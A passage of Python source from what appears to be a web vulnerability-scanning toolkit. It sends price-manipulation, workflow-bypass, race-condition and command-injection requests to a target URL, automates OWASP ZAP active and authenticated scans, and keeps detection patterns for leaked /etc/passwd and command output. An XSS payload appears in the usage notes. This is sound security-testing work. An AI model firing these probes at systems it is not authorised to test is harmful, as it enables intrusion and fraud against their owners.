                           workflow_steps: List[Dict]) -> List[Vulnerability]:
    vulnerabilities = []
    
    price_payloads = PayloadLibrary.BUSINESS_LOGIC_PAYLOADS['price_manipulation']
    
    for step in workflow_steps:
        if 'price' in str(step).lower() or 'amount' in str(step).lower():
            for price_payload in price_payloads:
                try:
                    # Simulate price manipulation
                    test_data = step.copy() if isinstance(step, dict) else {}
                    test_data.update({'price': price_payload, 'amount': price_payload})
                    
                    response = session.post(url, data=test_data)
                    
                    if _detect_price_manipulation_success(response, price_payload):
                        vuln = create_vulnerability(
                            vuln_type='Price Manipulation',
                            severity='Critical',
                            evidence=f'Price manipulation successful with value: {price_payload}',
                            payload=str(price_payload),
                            url=url,
                            technique='Business logic bypass',
                            business_impact='Financial loss through price manipulation',
                            remediation="Implement server-side price validation and business rule enforcement"
                        )
                        vulnerabilities.append(vuln)
                        
                except Exception as e:
                    logging.error(f"Error testing price manipulation: {e}")
    
    return vulnerabilities

def _test_quantity_bypass(session: requests.Session, url: str, 
                         workflow_steps: List[Dict]) -> List[Vulnerability]:
    vulnerabilities = []
    
    quantity_payloads = PayloadLibrary.BUSINESS_LOGIC_PAYLOADS['quantity_bypass']
    
    for step in workflow_steps:
        if 'quantity' in str(step).lower() or 'qty' in str(step).lower():
            for qty_payload in quantity_payloads:
                try:
                    test_data = step.copy() if isinstance(step, dict) else {}
                    test_data.update({'quantity': qty_payload, 'qty': qty_payload})
                    
                    response = session.post(url, data=test_data)
                    
                    if response.status_code == 200:
                        vuln = create_vulnerability(
                            vuln_type='Quantity Bypass',
                            severity='High',
                            evidence=f'Quantity restriction bypass with value: {qty_payload}',
                            payload=str(qty_payload),
                            url=url,
                            technique='Business logic bypass',
                            business_impact='Inventory manipulation and business rule violation',
                            remediation="Implement server-side quantity validation and stock controls"
                        )
                        vulnerabilities.append(vuln)
                        
                except Exception as e:
                    logging.error(f"Error testing quantity bypass: {e}")
    
    return vulnerabilities

def _test_workflow_bypass(session: requests.Session, url: str, 
                         workflow_steps: List[Dict]) -> List[Vulnerability]:
    vulnerabilities = []
    
    bypass_payloads = PayloadLibrary.BUSINESS_LOGIC_PAYLOADS['workflow_bypass']
    
    for payload in bypass_payloads:
        try:
            test_data = {'status': payload, 'approved': payload, 'admin': payload}
            response = session.post(url, data=test_data)
            
            if _detect_workflow_bypass_success(response, payload):
                vuln = create_vulnerability(
                    vuln_type='Workflow Bypass',
                    severity='Critical',
                    evidence=f'Workflow bypass successful with: {payload}',
                    payload=str(payload),
                    url=url,
                    technique='Business logic bypass',
                    business_impact='Authorization bypass and workflow manipulation',
                    remediation="Implement proper workflow state validation and authorization checks"
                )
                vulnerabilities.append(vuln)
                
        except Exception as e:
            logging.error(f"Error testing workflow bypass: {e}")
    
    return vulnerabilities

def _test_race_conditions(session: requests.Session, url: str) -> List[Vulnerability]:
    vulnerabilities = []
    
    race_targets = PayloadLibrary.BUSINESS_LOGIC_PAYLOADS['race_condition_targets']
    
    for target in race_targets:
        if target in url:
            try:
                # Simulate concurrent requests
                import threading
                import queue
                
                results = queue.Queue()
                
                def make_request():
                    try:
                        response = session.post(url, data={'action': 'process'})
                        results.put(response.status_code)
                    except Exception:
                        results.put(None)
                
                # Launch concurrent requests
                threads = []
                for _ in range(5):
                    thread = threading.Thread(target=make_request)
                    threads.append(thread)
                    thread.start()
                
                # Wait for completion
                for thread in threads:
                    thread.join()
                
                # Analyze results
                status_codes = []
                while not results.empty():
                    code = results.get()
                    if code:
                        status_codes.append(code)
                
                # Check for race condition indicators
                if len(set(status_codes)) > 1:  # Different responses
                    vuln = create_vulnerability(
                        vuln_type='Race Condition',
                        severity='High',
                        evidence=f'Race condition detected - varying responses: {status_codes}',
                        url=url,
                        technique='Concurrent request exploitation',
                        business_impact='Data integrity violations and transaction manipulation',
                        remediation="Implement proper locking mechanisms and atomic operations"
                    )
                    vulnerabilities.append(vuln)
                    
            except Exception as e:
                logging.error(f"Error testing race conditions: {e}")
    
    return vulnerabilities

def _test_command_injection_get(session: requests.Session, url: str, 
                               parameter: str, payload: str) -> List[Vulnerability]:
    vulnerabilities = []
    
    try:
        test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
        response = session.get(test_url, timeout=15)
        
        if _detect_command_injection(response, payload):
            vuln = create_vulnerability(
                vuln_type='Command Injection',
                severity='Critical',
                evidence='Command injection detected in response',
                location='GET parameter',
                parameter=parameter,
                payload=payload,
                url=test_url,
                response_code=response.status_code,
                technique='OS command execution',
                business_impact='Complete system compromise possible',
                remediation="Sanitize user input and avoid executing system commands with user data"
            )
            vulnerabilities.append(vuln)
            
    except Exception as e:
        logging.error(f"Error testing command injection GET: {e}")
    
    return vulnerabilities

def _test_command_injection_post(session: requests.Session, url: str, 
                                parameter: str, payload: str) -> List[Vulnerability]:
    vulnerabilities = []
    
    try:
        post_data = {parameter: payload}
        response = session.post(url, data=post_data, timeout=15)
        
        if _detect_command_injection(response, payload):
            vuln = create_vulnerability(
                vuln_type='Command Injection',
                severity='Critical',
                evidence='Command injection detected in POST response',
                location='POST parameter',
                parameter=parameter,
                payload=payload,
                url=url,
                response_code=response.status_code,
                technique='OS command execution',
                business_impact='Complete system compromise possible',
                remediation="Implement input validation and use safe APIs instead of system commands"
            )
            vulnerabilities.append(vuln)
            
    except Exception as e:
        logging.error(f"Error testing command injection POST: {e}")
    
    return vulnerabilities

def _detect_command_injection(response: requests.Response, payload: str) -> bool:
    response_text = response.text.lower()
    
    # Check for command output indicators
    command_indicators = [
        'uid=', 'gid=', 'groups=',  # id command
        'total ', 'drwxr',  # ls command output
        'inet addr:', 'lo        link',  # ifconfig output
        'kernel ', 'gnu/linux',  # uname output
        'root:', 'daemon:', 'bin:',  # /etc/passwd content
        'tcp', 'udp', 'listen'  # netstat output
    ]
    
    # Check for time delay (for sleep payloads)
    if 'sleep' in payload.lower() and response.elapsed.total_seconds() > 3:
        return True
    
    return any(indicator in response_text for indicator in command_indicators)

def _detect_xxe_vulnerability(response: requests.Response, payload: str) -> bool:
    response_text = response.text
    
    # Check for file content indicators
    file_indicators = [
        'root:', 'daemon:', 'bin:',  # /etc/passwd
        'localhost', '127.0.0.1',  # hosts file
        '<?xml', 'DOCTYPE'  # XML processing errors
    ]
    
    # Check for error messages indicating XXE processing
    xxe_errors = [
        'entity', 'external', 'dtd', 'xml',
        'parse', 'document', 'schema'
    ]
    
    return (any(indicator in response_text for indicator in file_indicators) or
            any(error in response_text.lower() for error in xxe_errors))

def _assess_file_disclosure_risk(path: str, response: requests.Response) -> str:
    """Assess risk level of disclosed files"""
    path_lower = path.lower()
    content_lower = response.text[:1000].lower()
    
    # Critical files
    if any(pattern in path_lower for pattern in ['.env', 'config', 'database', 'backup', '.git']):
        return 'Critical'
    
    # High risk files
    if any(pattern in path_lower for pattern in ['admin', 'debug', 'test', 'phpinfo']):
        return 'High'
    
    # Check content for sensitive data
    if any(keyword in content_lower for keyword in 
           ['password', 'secret', 'key', 'token', 'database', 'config']):
        return 'High'
    
    # Medium risk
    if any(pattern in path_lower for pattern in ['robots.txt', 'sitemap', 'swagger']):
        return 'Medium'
    
    return 'Low'

def _test_error_disclosure(session: requests.Session, url: str) -> List[Vulnerability]:
    """Test for error-based information disclosure"""
    vulnerabilities = []
    
    error_triggers = [
        "/'", '/"', '/null', '/undefined', '/{invalid}',
        '?debug=true', '?test=1', '?error=1'
    ]
    
    for trigger in error_triggers:
        try:
            test_url = url + trigger
            response = session.get(test_url)
            
            if _contains_error_disclosure(response.text):
                vuln = create_vulnerability(
                    vuln_type='Error-based Information Disclosure',
                    severity='Medium',
                    evidence='Application errors reveal sensitive information',
                    url=test_url,
                    payload=trigger,
                    response_code=response.status_code,
                    technique='Error message analysis',
                    business_impact='Technical information exposed through error messages',
                    remediation="Implement custom error pages and sanitize error messages"
                )
                vulnerabilities.append(vuln)
                
        except Exception:
            pass
    
    return vulnerabilities

def _test_header_disclosure(session: requests.Session, url: str) -> List[Vulnerability]:
    """Test HTTP headers for information disclosure"""
    vulnerabilities = []
    
    try:
        response = session.get(url)
        
        # Check for sensitive headers
        sensitive_headers = {
            'server': 'Server version disclosure',
            'x-powered-by': 'Technology stack disclosure',
            'x-aspnet-version': 'ASP.NET version disclosure',
            'x-generator': 'Framework disclosure'
        }
        
        for header, description in sensitive_headers.items():
            if header in response.headers:
                vuln = create_vulnerability(
                    vuln_type='Header Information Disclosure',
                    severity='Low',
                    evidence=f'{description}: {response.headers[header]}',
                    url=url,
                    location=f'{header} header',
                    technique='HTTP header analysis',
                    business_impact='Technology stack information exposed',
                    remediation=f"Remove or modify the {header} header to avoid information disclosure"
                )
                vulnerabilities.append(vuln)
                
    except Exception:
        pass
    
    return vulnerabilities

def _contains_error_disclosure(response_text: str) -> bool:
    """Check if response contains error-based information disclosure"""
    error_patterns = [
        'stack trace', 'exception', 'error',
        'warning:', 'notice:', 'fatal error',
        'mysql', 'postgresql', 'oracle',
        'apache', 'nginx', 'iis',
        'php version', 'python', 'java',
        'file not found', 'access denied'
    ]
    
    response_lower = response_text.lower()
    return any(pattern in response_lower for pattern in error_patterns)

def _detect_price_manipulation_success(response: requests.Response, payload: str) -> bool:
    """Detect successful price manipulation"""
    if response.status_code == 200:
        return 'success' in response.text.lower() or 'confirmed' in response.text.lower()
    return False

def _detect_workflow_bypass_success(response: requests.Response, payload: str) -> bool:
    """Detect successful workflow bypass"""
    if response.status_code == 200:
        success_indicators = ['approved', 'success', 'confirmed', 'processed']
        return any(indicator in response.text.lower() for indicator in success_indicators)
    return False

# ===== OWASP ZAP INTEGRATION FUNCTIONS =====

def zap_passive_scan(target_url: str, spider_minutes: int = 2) -> ToolCallResult:
    """
    Execute OWASP ZAP passive scan with spidering
    
    Args:
        target_url: Target URL for scanning
        spider_minutes: Minutes to spend spidering
    
    Returns:
        ToolCallResult with ZAP passive scan findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    if not ZAP_AVAILABLE:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Passive Scan",
            error="ZAP library not available. Install with: pip install python-owasp-zap-v2.4",
            execution_time=time.time() - start_time
        )
    
    try:
        # Initialize ZAP connection
        zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
        
        # Test ZAP connection
        try:
            zap.core.version
        except Exception as e:
            return ToolCallResult(
                success=False,
                tool_name="ZAP Passive Scan",
                error=f"Cannot connect to ZAP proxy on 127.0.0.1:8080. Ensure ZAP is running. Error: {str(e)}",
                execution_time=time.time() - start_time
            )
        
        # Clear previous session
        zap.core.new_session()
        
        # Add target to context
        context_name = "heimdall_scan"
        context_id = zap.context.new_context(context_name)
        zap.context.include_in_context(context_name, f"{target_url}.*")
        
        # Spider the target
        logging.info(f"Starting ZAP spider on {target_url}")
        spider_id = zap.spider.scan(target_url)
        
        # Wait for spider completion or timeout
        spider_timeout = spider_minutes * 60
        start_spider = time.time()
        
        while int(zap.spider.status(spider_id)) < 100:
            if time.time() - start_spider > spider_timeout:
                zap.spider.stop(spider_id)
                break
            time.sleep(2)
        
        logging.info(f"Spider completed. Found {len(zap.spider.results(spider_id))} URLs")
        
        # Get passive scan alerts
        alerts = zap.core.alerts()
        
        # Convert ZAP alerts to vulnerabilities
        for alert in alerts:
            risk_level = _map_zap_risk_to_severity(alert.get('risk', 'Low'))
            
            vuln = create_vulnerability(
                vuln_type=alert.get('alert', 'ZAP Finding'),
                severity=risk_level,
                evidence=alert.get('description', 'ZAP passive scan finding'),
                url=alert.get('url', target_url),
                parameter=alert.get('param', ''),
                tool='OWASP ZAP',
                technique='Passive scanning',
                cvss_score=_map_zap_risk_to_cvss(alert.get('risk', 'Low')),
                business_impact=f"ZAP Risk: {alert.get('risk', 'Unknown')}",
                remediation=alert.get('solution', 'Review ZAP documentation for remediation'),
                references=[alert.get('reference', '')]
            )
            vulnerabilities.append(vuln)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="ZAP Passive Scan",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target_url': target_url,
                'spider_minutes': spider_minutes,
                'urls_found': len(zap.spider.results(spider_id)) if spider_id else 0,
                'alerts_found': len(alerts),
                'zap_version': zap.core.version
            },
            business_impact=f"ZAP passive scan: {len(vulnerabilities)} security issues identified",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Comprehensive web application security assessment"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Passive Scan",
            error=f"ZAP scan failed: {str(e)}",
            execution_time=time.time() - start_time
        )

def zap_active_scan(target_url: str, scan_policy: str = "Default Policy", 
                   max_scan_time: int = 10) -> ToolCallResult:
    """
    Execute OWASP ZAP active vulnerability scan
    
    Args:
        target_url: Target URL for active scanning
        scan_policy: ZAP scan policy to use
        max_scan_time: Maximum scan time in minutes
    
    Returns:
        ToolCallResult with ZAP active scan findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    if not ZAP_AVAILABLE:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Active Scan",
            error="ZAP library not available",
            execution_time=time.time() - start_time
        )
    
    try:
        zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
        
        # Test connection
        try:
            zap.core.version
        except Exception as e:
            return ToolCallResult(
                success=False,
                tool_name="ZAP Active Scan",
                error=f"Cannot connect to ZAP: {str(e)}",
                execution_time=time.time() - start_time
            )
        
        # Access the target first (for session establishment)
        logging.info(f"Accessing target: {target_url}")
        zap.core.access_url(target_url)
        
        # Start active scan
        logging.info(f"Starting ZAP active scan on {target_url}")
        scan_id = zap.ascan.scan(target_url, scanpolicyname=scan_policy)
        
        # Monitor scan progress
        scan_timeout = max_scan_time * 60
        scan_start = time.time()
        
        while int(zap.ascan.status(scan_id)) < 100:
            progress = int(zap.ascan.status(scan_id))
            logging.info(f"Active scan progress: {progress}%")
            
            if time.time() - scan_start > scan_timeout:
                logging.info("Scan timeout reached, stopping active scan")
                zap.ascan.stop(scan_id)
                break
            
            time.sleep(10)
        
        # Get scan results
        alerts = zap.core.alerts()
        
        # Filter for high-confidence active scan findings
        active_alerts = [alert for alert in alerts if alert.get('confidence', '').lower() in ['high', 'medium']]
        
        for alert in active_alerts:
            risk_level = _map_zap_risk_to_severity(alert.get('risk', 'Low'))
            
            vuln = create_vulnerability(
                vuln_type=alert.get('alert', 'ZAP Active Finding'),
                severity=risk_level,
                evidence=f"Active scan finding: {alert.get('description', '')}",
                url=alert.get('url', target_url),
                parameter=alert.get('param', ''),
                payload=alert.get('attack', ''),
                tool='OWASP ZAP Active',
                technique='Active vulnerability scanning',
                cvss_score=_map_zap_risk_to_cvss(alert.get('risk', 'Low')),
                business_impact=f"Active vulnerability - Risk: {alert.get('risk', 'Unknown')}",
                remediation=alert.get('solution', 'Review ZAP active scan recommendations'),
                references=[alert.get('reference', '')]
            )
            vulnerabilities.append(vuln)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="ZAP Active Scan",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target_url': target_url,
                'scan_policy': scan_policy,
                'max_scan_time': max_scan_time,
                'total_alerts': len(alerts),
                'high_confidence_alerts': len(active_alerts)
            },
            business_impact=f"ZAP active scan: {len(vulnerabilities)} confirmed vulnerabilities",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Active vulnerability verification - immediate remediation required"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Active Scan",
            error=f"ZAP active scan failed: {str(e)}",
            execution_time=time.time() - start_time
        )

def zap_authenticated_scan(target_url: str, auth_config: Dict[str, str], 
                          scan_type: str = "both") -> ToolCallResult:
    """
    Execute authenticated ZAP scan with session management
    
    Args:
        target_url: Target URL
        auth_config: Authentication configuration
        scan_type: "passive", "active", or "both"
    
    Returns:
        ToolCallResult with authenticated scan findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    if not ZAP_AVAILABLE:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Authenticated Scan",
            error="ZAP library not available",
            execution_time=time.time() - start_time
        )
    
    try:
        zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
        
        # Create context for authenticated scanning
        context_name = "authenticated_scan"
        context_id = zap.context.new_context(context_name)
        zap.context.include_in_context(context_name, f"{target_url}.*")
        
        # Configure authentication if credentials provided
        if auth_config.get('username') and auth_config.get('password'):
            # Set up form-based authentication
            login_url = auth_config.get('login_url', f"{target_url}/login")
            
            auth_method_id = zap.authentication.set_authentication_method(
                context_id,
                'formBasedAuthentication',
                f'loginUrl={login_url}&loginRequestData=username%3D{auth_config["username"]}%26password%3D{auth_config["password"]}'
            )
            
            # Create user for authenticated scanning
            user_id = zap.users.new_user(context_id, 'heimdall_user')
            zap.users.set_authentication_credentials(
                context_id, user_id,
                f'username={auth_config["username"]}&password={auth_config["password"]}'
            )
            zap.users.set_user_enabled(context_id, user_id, 'true')
        
        # Perform authenticated spider if passive scan requested
        if scan_type in ["passive", "both"]:
            logging.info("Starting authenticated spider")
            spider_id = zap.spider.scan_as_user(context_id, user_id if 'user_id' in locals() else None, target_url)
            
            # Wait for spider completion
            while int(zap.spider.status(spider_id)) < 100:
                time.sleep(2)
        
        # Perform active scan if requested
        if scan_type in ["active", "both"]:
            logging.info("Starting authenticated active scan")
            ascan_id = zap.ascan.scan_as_user(target_url, context_id, user_id if 'user_id' in locals() else None)
            
            # Monitor active scan
            while int(zap.ascan.status(ascan_id)) < 100:
                time.sleep(10)
        
        # Collect results
        alerts = zap.core.alerts()
        
        for alert in alerts:
            risk_level = _map_zap_risk_to_severity(alert.get('risk', 'Low'))
            
            vuln = create_vulnerability(
                vuln_type=f"Authenticated {alert.get('alert', 'ZAP Finding')}",
                severity=risk_level,
                evidence=f"Authenticated scan finding: {alert.get('description', '')}",
                url=alert.get('url', target_url),
                parameter=alert.get('param', ''),
                tool='OWASP ZAP Authenticated',
                technique=f'Authenticated {scan_type} scanning',
                cvss_score=_map_zap_risk_to_cvss(alert.get('risk', 'Low')),
                business_impact=f"Post-authentication vulnerability - Risk: {alert.get('risk', 'Unknown')}",
                remediation=alert.get('solution', 'Review authenticated scan recommendations')
            )
            vulnerabilities.append(vuln)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="ZAP Authenticated Scan",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target_url': target_url,
                'scan_type': scan_type,
                'authenticated': bool(auth_config.get('username')),
                'alerts_found': len(alerts)
            },
            business_impact=f"Authenticated scan: {len(vulnerabilities)} post-login vulnerabilities",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Post-authentication security assessment"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Authenticated Scan",
            error=f"Authenticated scan failed: {str(e)}",
            execution_time=time.time() - start_time
        )

def zap_comprehensive_scan(target_url: str, auth_config: Dict[str, str] = None,
                          include_active: bool = True) -> ToolCallResult:
    """
    Execute comprehensive ZAP scan combining multiple techniques
    
    Args:
        target_url: Target URL for scanning
        auth_config: Optional authentication configuration
        include_active: Whether to include active scanning
    
    Returns:
        ToolCallResult with comprehensive scan findings
    """
    start_time = time.time()
    all_vulnerabilities = []
    
    try:
        # Phase 1: Passive Scan
        passive_result = zap_passive_scan(target_url, spider_minutes=3)
        if passive_result.success:
            all_vulnerabilities.extend(passive_result.vulnerabilities)
        
        # Phase 2: Active Scan (if requested)
        if include_active:
            active_result = zap_active_scan(target_url, max_scan_time=5)
            if active_result.success:
                all_vulnerabilities.extend(active_result.vulnerabilities)
        
        # Phase 3: Authenticated Scan (if credentials provided)
        if auth_config:
            auth_result = zap_authenticated_scan(target_url, auth_config, "both" if include_active else "passive")
            if auth_result.success:
                all_vulnerabilities.extend(auth_result.vulnerabilities)
        
        # Deduplicate vulnerabilities
        unique_vulnerabilities = _deduplicate_zap_findings(all_vulnerabilities)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="ZAP Comprehensive Scan",
            vulnerabilities=unique_vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target_url': target_url,
                'phases_completed': 3 if auth_config else (2 if include_active else 1),
                'authenticated': bool(auth_config),
                'active_scanning': include_active,
                'total_findings': len(all_vulnerabilities),
                'unique_findings': len(unique_vulnerabilities)
            },
            business_impact=f"Comprehensive ZAP assessment: {len(unique_vulnerabilities)} security issues",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in unique_vulnerabilities] + [0.0]),
            compliance_risk="Complete web application security assessment"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Comprehensive Scan",
            error=f"Comprehensive scan failed: {str(e)}",
            execution_time=time.time() - start_time
        )

# ===== ZAP HELPER FUNCTIONS =====

def _map_zap_risk_to_severity(zap_risk: str) -> str:
    """Map ZAP risk levels to standard severity levels"""
    risk_mapping = {
        'High': 'Critical',
        'Medium': 'High', 
        'Low': 'Medium',
        'Informational': 'Low',
        'Info': 'Low'
    }
    return risk_mapping.get(zap_risk, 'Medium')

def _map_zap_risk_to_cvss(zap_risk: str) -> float:
    """Map ZAP risk levels to CVSS scores"""
    cvss_mapping = {
        'High': 8.5,
        'Medium': 6.0,
        'Low': 3.5,
        'Informational': 1.0,
        'Info': 1.0
    }
    return cvss_mapping.get(zap_risk, 5.0)

def _deduplicate_zap_findings(vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
    """Remove duplicate findings from ZAP scans"""
    seen = set()
    unique_vulns = []
    
    for vuln in vulnerabilities:
        # Create a hash based on type, URL, and parameter
        if isinstance(vuln, Vulnerability):
            key = f"{vuln.type}|{vuln.url}|{vuln.parameter}"
        else:
            key = f"{vuln.get('type', '')}|{vuln.get('url', '')}|{vuln.get('parameter', '')}"
        
        if key not in seen:
            seen.add(key)
            unique_vulns.append(vuln)
    
    return unique_vulns

# ===== HYBRID SCANNING FUNCTIONS =====

def hybrid_comprehensive_scan(target_url: str, auth_config: Dict[str, str] = None,
                             use_zap: bool = True, use_custom: bool = True) -> ToolCallResult:
    """
    Execute hybrid scan using both ZAP and custom testing functions
    
    Args:
        target_url: Target URL for scanning
        auth_config: Optional authentication configuration
        use_zap: Whether to include ZAP scanning
        use_custom: Whether to include custom testing
    
    Returns:
        ToolCallResult with combined findings from all approaches
    """
    start_time = time.time()
    all_vulnerabilities = []
    scan_metadata = {}
    
    try:
        # ZAP-based scanning
        if use_zap and ZAP_AVAILABLE:
            logging.info("Starting ZAP-based scanning")
            zap_result = zap_comprehensive_scan(target_url, auth_config, include_active=True)
            if zap_result.success:
                all_vulnerabilities.extend(zap_result.vulnerabilities)
                scan_metadata['zap_findings'] = len(zap_result.vulnerabilities)
            else:
                scan_metadata['zap_error'] = zap_result.error
        
        # Custom testing functions
        if use_custom:
            logging.info("Starting custom testing")
            custom_results = run_comprehensive_scan(target_url, {
                'sql_injection': True,
                'xss': True,
                'api_discovery': True,
                'information_disclosure': True,
                'command_injection': True,
                'xxe': True
            })
            
            custom_count = 0
            for test_name, result in custom_results.items():
                if result.success:
                    all_vulnerabilities.extend(result.vulnerabilities)
                    custom_count += len(result.vulnerabilities)
            
            scan_metadata['custom_findings'] = custom_count
        
        # Combine and deduplicate results
        unique_vulnerabilities = _deduplicate_hybrid_findings(all_vulnerabilities)
        
        execution_time = time.time() - start_time
        
        # Determine overall business impact
        critical_count = sum(1 for v in unique_vulnerabilities if 
                           (v.severity if isinstance(v, Vulnerability) else v.get('severity', '')) == 'Critical')
        high_count = sum(1 for v in unique_vulnerabilities if 
                        (v.severity if isinstance(v, Vulnerability) else v.get('severity', '')) == 'High')
        
        if critical_count > 0:
            business_impact = f"CRITICAL - {critical_count} critical vulnerabilities require immediate attention"
        elif high_count > 0:
            business_impact = f"HIGH - {high_count} high-risk vulnerabilities identified"
        else:
            business_impact = f"MODERATE - {len(unique_vulnerabilities)} security issues identified"
        
        return ToolCallResult(
            success=True,
            tool_name="Hybrid Comprehensive Scan",
            vulnerabilities=unique_vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target_url': target_url,
                'zap_enabled': use_zap and ZAP_AVAILABLE,
                'custom_enabled': use_custom,
                'authenticated': bool(auth_config),
                **scan_metadata,
                'total_unique_findings': len(unique_vulnerabilities),
                'critical_findings': critical_count,
                'high_findings': high_count
            },
            business_impact=business_impact,
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in unique_vulnerabilities] + [0.0]),
            compliance_risk="Complete hybrid security assessment combining industry tools and custom testing"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="Hybrid Comprehensive Scan",
            error=f"Hybrid scan failed: {str(e)}",
            execution_time=time.time() - start_time
        )

def _deduplicate_hybrid_findings(vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
    """Remove duplicates between ZAP and custom findings"""
    seen = set()
    unique_vulns = []
    
    for vuln in vulnerabilities:
        # Create a more sophisticated deduplication key
        if isinstance(vuln, Vulnerability):
            # Normalize vulnerability types for comparison
            vuln_type = vuln.type.lower().replace(' ', '_')
            url = vuln.url or ''
            param = vuln.parameter or ''
        else:
            vuln_type = vuln.get('type', '').lower().replace(' ', '_')
            url = vuln.get('url', '')
            param = vuln.get('parameter', '')
        
        # Create composite key
        key = f"{vuln_type}|{url}|{param}"
        
        if key not in seen:
            seen.add(key)
            unique_vulns.append(vuln)
        else:
            # If we've seen this before, keep the one with higher severity/better detail
            existing_vuln = next((v for v in unique_vulns if 
                                f"{(v.type if isinstance(v, Vulnerability) else v.get('type', '')).lower().replace(' ', '_')}|{v.url if isinstance(v, Vulnerability) else v.get('url', '')}|{v.parameter if isinstance(v, Vulnerability) else v.get('parameter', '')}" == key), None)
            
            if existing_vuln:
                existing_severity = existing_vuln.severity if isinstance(existing_vuln, Vulnerability) else existing_vuln.get('severity', 'Low')
                current_severity = vuln.severity if isinstance(vuln, Vulnerability) else vuln.get('severity', 'Low')
                
                # Replace if current has higher severity
                severity_order = {'Critical': 4, 'High': 3, 'Medium': 2, 'Low': 1}
                if severity_order.get(current_severity, 1) > severity_order.get(existing_severity, 1):
                    unique_vulns.remove(existing_vuln)
                    unique_vulns.append(vuln)
    
    return unique_vulns

# ===== COMPREHENSIVE FUNCTION INDEX AND USAGE =====

"""
VAPT FUNCTION TOOLKIT - COMPLETE REFERENCE

This module provides a comprehensive collection of expert-level penetration testing
functions that can be called independently from anywhere in the codebase.

=== CORE TESTING FUNCTIONS ===

SQL INJECTION:
- sql_injection_test(url, parameter="id", payload=None, test_type="basic")
- sqlmap_campaign(url, options=None)

CROSS-SITE SCRIPTING:
- xss_test(url, parameter="search", payload=None, test_type="basic")

NETWORK RECONNAISSANCE:
- nmap_scan(target, scan_type="basic", ports=None)
- port_scan(host, ports, scan_timeout=5)

API SECURITY:
- api_endpoint_discovery(base_url, wordlist=None)
- jwt_vulnerability_test(token)

ADVANCED VULNERABILITIES:
- idor_test(endpoint, parameter, test_values=None)
- business_logic_test(url, workflow_steps, test_type="basic")
- command_injection_test(url, parameter="cmd", payload=None)
- xxe_test(url, xml_parameter="data", payload=None)
- information_disclosure_test(url)

=== USAGE EXAMPLES ===

# Basic SQL injection testing
result = sql_injection_test("https://example.com/login", "username")

# Comprehensive XSS testing with custom payload
result = xss_test(
    "https://example.com/search", 
    "query", 
    "<script>alert('XSS')</script>", 
    "comprehensive"
)

# Network reconnaissance
result = nmap_scan("192.168.1.1", "comprehensive")

# API security assessment
endpoints = api_endpoint_discovery("https://api.example.com")
jwt_vulns = jwt_vulnerability_test("eyJhbGciOiJIUzI1NiJ9...")

# Advanced business logic testing
result = business_logic_test(
    "https://shop.example.com/checkout",
    [{"price": "100", "quantity": "1"}],
    "comprehensive"
)

=== CONFIGURATION ===

Configure global settings using VAPT_CONFIG:
VAPT_CONFIG['timeout'] = 60
VAPT_CONFIG['debug'] = True
VAPT_CONFIG['output_dir'] = './custom_results'

=== RETURN FORMAT ===

All functions return ToolCallResult objects with:
- success: bool
- tool_name: str
- vulnerabilities: List[Dict]
- execution_time: float
- business_impact: str
- cvss_score: float
- compliance_risk: str
- metadata: Dict
"""

# ===== CONFIGURATION MANAGEMENT =====

def configure_vapt(config_updates: Dict[str, Any]) -> Dict[str, Any]:
    """
    Update global VAPT configuration
    
    Args:
        config_updates: Dictionary of configuration updates
    
    Returns:
        Updated configuration dictionary
    """
    global VAPT_CONFIG
    VAPT_CONFIG.update(config_updates)
    
    # Ensure output directory exists
    Path(VAPT_CONFIG['output_dir']).mkdir(parents=True, exist_ok=True)
    
    return VAPT_CONFIG.copy()

def get_vapt_config() -> Dict[str, Any]:
    """Get current VAPT configuration"""
    return VAPT_CONFIG.copy()

def reset_vapt_config() -> Dict[str, Any]:
    """Reset VAPT configuration to defaults"""
    global VAPT_CONFIG
    VAPT_CONFIG = {
        'timeout': 30,
        'output_dir': './vapt_results',
        'debug': False,
        'max_threads': 10,
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    return VAPT_CONFIG.copy()

# ===== BATCH TESTING FUNCTIONS =====

def run_comprehensive_scan(target_url: str, scan_config: Dict[str, Any] = None) -> Dict[str, ToolCallResult]:
    """
    Run comprehensive security scan with multiple test types
    
    Args:
